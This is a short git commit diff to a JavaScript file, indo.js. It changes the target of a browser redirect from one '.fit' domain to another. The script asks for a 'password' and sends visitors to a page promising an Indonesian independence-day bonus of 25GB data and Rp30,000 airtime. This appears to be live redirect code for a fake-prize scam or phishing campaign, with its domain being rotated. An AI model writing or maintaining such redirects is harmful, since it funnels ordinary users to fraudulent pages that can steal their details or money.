d2c4a5d562153ef806d50785616647906a9f2f16
weallneedgod <darter-deaths2p@icloud.com>
2026-08-15 13:42:55 -1200

    Update indo.js

--- indo.js
+++ indo.js
@@ -5,6 +5,6 @@ password = prompt(
 
 );if (password != '25GB DATA + Pulsa Rp30,000') {
 
-    location.href = 'https://www.energyflower.fit/bonus-perayaan-hari-kemerdekaan';
+    location.href = 'https://www.akpanbernard.fit/bonus-perayaan-hari-kemerdekaan';
 
 }
